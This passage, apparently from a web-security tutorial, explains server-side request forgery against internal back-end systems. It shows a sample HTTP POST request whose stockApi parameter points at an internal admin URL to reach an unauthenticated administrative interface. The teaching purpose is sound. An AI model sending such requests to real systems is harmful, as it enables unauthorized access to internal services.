 In many cases, internal back-end systems contain sensitive functionality that can be accessed 
 without authentication by anyone who is able to interact with the systems.

 In the previous example, imagine there is an administrative interface at the back-end URL `https://192.168.0.68/admin` 
 An attacker can submit the following request to exploit the SSRF vulnerability, and access the administrative interface:

 ```bash
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```
